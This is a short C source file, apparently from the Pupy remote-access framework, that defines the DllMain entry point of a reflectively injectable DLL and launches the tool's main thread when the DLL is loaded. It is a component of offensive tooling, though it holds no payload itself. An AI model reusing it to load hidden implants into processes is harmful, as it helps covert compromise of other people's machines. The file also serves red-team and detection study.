/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>
#include "pupy_load.h"
#include "ReflectiveDllInjection.h"

extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	HANDLE hThread;
	DWORD threadId;
    BOOL bReturnValue = TRUE;
	switch( dwReason )
    {
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
		break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			mainThread(NULL);
            /*
			hThread = CreateThread(NULL,
					0,		// dwStackSize
					mainThread,	// lpStartAddress
					NULL,		// lpParameter
					0,		// dwCreationFlags (0==run right after creation)
					&threadId
					);
            */
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
